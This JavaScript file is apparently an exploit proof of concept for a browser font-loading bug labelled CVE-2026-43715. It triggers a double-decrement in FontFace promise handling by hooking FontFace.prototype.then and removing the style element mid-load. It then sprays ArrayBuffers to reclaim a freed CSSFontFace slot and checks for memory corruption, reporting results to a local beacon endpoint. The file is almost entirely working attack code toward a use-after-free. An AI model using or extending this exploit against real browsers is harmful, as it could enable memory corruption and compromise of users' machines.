// p457-fontface-eager-promise.js — CVE-2026-43715: eager promise creation for double-decrement
//
// KEY INSIGHT: DOMPromiseProxyWithResolveCallback is LAZY.
// If .loaded is NOT accessed before .load(), the JS promise doesn't exist during
// iterateClients, so the .then getter fires AFTER setStatus completes (m_status=Success).
// remove() sees Success → no decrement → no double-decrement.
//
// FIX: Access .loaded FIRST to populate m_deferredPromises. Then resolve() during
// iterateClients resolves the JS promise synchronously → .then getter fires while
// m_status is still Loading → remove() sees Loading → double-decrement.
//
// TEST A: .loaded accessed BEFORE .load() (eager promise) — should trigger double-decrement
// TEST B: .loaded NOT accessed before .load() (lazy) — control, no double-decrement
// TEST C: .loaded + .load() + AB spray
(function() {
    var RUN = 'v457-' + Date.now().toString(36);
    function B(tag, body) {
        try {
            var x = new XMLHttpRequest();
            x.open('POST', '/beacon/' + tag + '/' + RUN, false);
            x.send(typeof body === 'object' ? JSON.stringify(body) : (body || ''));
        } catch(e) {}
    }

    B('BOOT', navigator.userAgent);

    // ═══════════════════════════════════════════════════════════════
    // TEST A: EAGER promise (.loaded before .load()) + status mismatch
    // ═══════════════════════════════════════════════════════════════
    try {
        var styleA = document.createElement('style');
        styleA.textContent = "@font-face { font-family: 'v457a'; src: local('Arial'), local('Helvetica'), local('sans-serif'); }";
        document.head.appendChild(styleA);

        var span = document.createElement('span');
        span.style.fontFamily = "'v457a', serif";
        span.textContent = 'EAGER';
        document.body.appendChild(span);
        document.body.offsetHeight;

        var faceA = null;
        document.fonts.forEach(function(f) {
            if (f.family.replace(/['"]/g,'') === 'v457a') faceA = f;
        });

        if (!faceA) {
            B('A-DEAD', 'NO-FACE');
        } else {
            // *** CRITICAL: access .loaded BEFORE .load() ***
            // This creates the DeferredPromise in the proxy, so resolve() during
            // iterateClients will synchronously resolve the JS promise.
            var loadedPromise = faceA.loaded;
            loadedPromise.catch(function(){}); // prevent unhandled rejection

            var thenA = 0, aErr = '';
            var innerState = {};

            Object.defineProperty(FontFace.prototype, 'then', { get: function() {
                thenA++;
                if (thenA > 1) return undefined;
                try {
                    // Record state BEFORE trigger
                    innerState.faceStatusPre = faceA.status;
                    innerState.fontsStatusPre = document.fonts.status;

                    // TRIGGER: remove <style> → face not in staging → remove(*face) in buildCompleted
                    styleA.remove();
                    document.body.offsetHeight;

                    // Record state AFTER trigger
                    innerState.faceStatusPost = faceA.status;
                    innerState.fontsStatusPost = document.fonts.status;
                    innerState.fontsSize = document.fonts.size;

                    B('A-INNER', innerState);
                } catch(e) { aErr += e.message; }
                return undefined;
            }, configurable: true });

            faceA.load();
            try { delete FontFace.prototype.then; } catch(e) {}

            B('A-POST', {
                thenFired: thenA,
                err: aErr,
                faceStatus: faceA.status,
                fontsStatus: document.fonts.status,
                fontsSize: document.fonts.size
            });

            // Status mismatch probe: add url() font → check if incrementActiveCount works normally
            var probeStyleA = document.createElement('style');
            probeStyleA.textContent = "@font-face { font-family: 'probeA457'; src: url('/nonexistent-v457a.woff2'); }";
            document.head.appendChild(probeStyleA);
            document.body.offsetHeight;

            var probeA = null;
            document.fonts.forEach(function(f) {
                if (f.family.replace(/['"]/g,'') === 'probeA457') probeA = f;
            });

            if (probeA) {
                probeA.load();
                var fontsAfterProbe = document.fonts.status;
                var mismatch = (probeA.status === 'loading' && fontsAfterProbe !== 'loading');
                B('A-PROBE', {
                    probeStatus: probeA.status,
                    fontsStatus: fontsAfterProbe,
                    mismatch: mismatch,
                    verdict: mismatch ? 'DOUBLE-DECREMENT-CONFIRMED' : 'NO-DETECT'
                });
                probeA.loaded.catch(function(){});
            } else {
                B('A-NO-PROBE', 'probe face not found');
            }
        }
    } catch(e) { B('A-ERR', e.message.slice(0,300)); }


    // ═══════════════════════════════════════════════════════════════
    // TEST B: LAZY promise (no .loaded access) — control
    // Same as V456 Test A — should show NO double-decrement
    // ═══════════════════════════════════════════════════════════════
    try {
        var styleB = document.createElement('style');
        styleB.textContent = "@font-face { font-family: 'v457b'; src: local('Arial'), local('Helvetica'), local('sans-serif'); }";
        document.head.appendChild(styleB);

        var spanB = document.createElement('span');
        spanB.style.fontFamily = "'v457b', serif";
        spanB.textContent = 'LAZY';
        document.body.appendChild(spanB);
        document.body.offsetHeight;

        var faceB = null;
        document.fonts.forEach(function(f) {
            if (f.family.replace(/['"]/g,'') === 'v457b') faceB = f;
        });

        if (!faceB) {
            B('B-DEAD', 'NO-FACE');
        } else {
            // NO .loaded access — lazy promise path (V456 behavior)
            var thenB = 0, innerStateB = {};

            Object.defineProperty(FontFace.prototype, 'then', { get: function() {
                thenB++;
                if (thenB > 1) return undefined;
                try {
                    innerStateB.faceStatusPre = faceB.status;
                    innerStateB.fontsStatusPre = document.fonts.status;
                    styleB.remove();
                    document.body.offsetHeight;
                    innerStateB.faceStatusPost = faceB.status;
                    innerStateB.fontsStatusPost = document.fonts.status;
                    innerStateB.fontsSize = document.fonts.size;
                    B('B-INNER', innerStateB);
                } catch(e) {}
                return undefined;
            }, configurable: true });

            faceB.load();
            try { delete FontFace.prototype.then; } catch(e) {}

            B('B-POST', {
                thenFired: thenB,
                faceStatus: faceB.status,
                fontsStatus: document.fonts.status
            });

            var probeStyleB = document.createElement('style');
            probeStyleB.textContent = "@font-face { font-family: 'probeB457'; src: url('/nonexistent-v457b.woff2'); }";
            document.head.appendChild(probeStyleB);
            document.body.offsetHeight;

            var probeB = null;
            document.fonts.forEach(function(f) {
                if (f.family.replace(/['"]/g,'') === 'probeB457') probeB = f;
            });

            if (probeB) {
                probeB.load();
                var mismatchB = (probeB.status === 'loading' && document.fonts.status !== 'loading');
                B('B-PROBE', {
                    probeStatus: probeB.status,
                    fontsStatus: document.fonts.status,
                    mismatch: mismatchB,
                    verdict: mismatchB ? 'DOUBLE-DECREMENT-CONFIRMED' : 'NO-DETECT'
                });
                probeB.loaded.catch(function(){});
            }
        }
    } catch(e) { B('B-ERR', e.message.slice(0,300)); }


    // ═══════════════════════════════════════════════════════════════
    // TEST C: EAGER promise + AB spray (for exploitation if double-decrement confirmed)
    // ═══════════════════════════════════════════════════════════════
    try {
        var styleC = document.createElement('style');
        styleC.textContent = "@font-face { font-family: 'v457c'; src: local('Arial'), local('Helvetica'), local('sans-serif'); }";
        document.head.appendChild(styleC);

        var spanC = document.createElement('span');
        spanC.style.fontFamily = "'v457c', serif";
        spanC.textContent = 'SPRAY';
        document.body.appendChild(spanC);
        document.body.offsetHeight;

        var faceC = null;
        document.fonts.forEach(function(f) {
            if (f.family.replace(/['"]/g,'') === 'v457c') faceC = f;
        });

        if (!faceC) {
            B('C-DEAD', 'NO-FACE');
        } else {
            // EAGER: access .loaded first
            var loadedC = faceC.loaded;
            loadedC.catch(function(){});

            var thenC = 0, cErr = '';
            var sprayC = [];

            Object.defineProperty(FontFace.prototype, 'then', { get: function() {
                thenC++;
                if (thenC > 1) return undefined;
                try {
                    styleC.remove();
                    document.body.offsetHeight;

                    // Spray ABs to reclaim freed CSSFontFace slot (~184 bytes)
                    for (var i = 0; i < 500; i++) {
                        var ab = new ArrayBuffer(184);
                        var v = new Uint8Array(ab);
                        for (var j = 0; j < 184; j++) v[j] = 0x41 + (i & 0x1F);
                        sprayC.push({ ab: ab, v: v });
                    }
                    B('C-SPRAYED', { count: sprayC.length });
                } catch(e) { cErr += e.message; }
                return undefined;
            }, configurable: true });

            faceC.load();
            try { delete FontFace.prototype.then; } catch(e) {}

            // Check spray for corruption
            var hits = [];
            for (var i = 0; i < sprayC.length; i++) {
                var v = sprayC[i].v;
                var expected = 0x41 + (i & 0x1F);
                for (var j = 0; j < 184; j++) {
                    if (v[j] !== expected) {
                        hits.push({ idx: i, off: j, got: v[j], exp: expected });
                        break;
                    }
                }
            }

            B('C-RESULT', {
                thenFired: thenC,
                err: cErr,
                faceStatus: faceC.status,
                sprayHits: hits.length,
                details: hits.slice(0, 10)
            });
            sprayC = null;
        }
    } catch(e) { B('C-ERR', e.message.slice(0,300)); }


    B('ALIVE', 'all-tests-completed');
    B('DONE', RUN);
})();
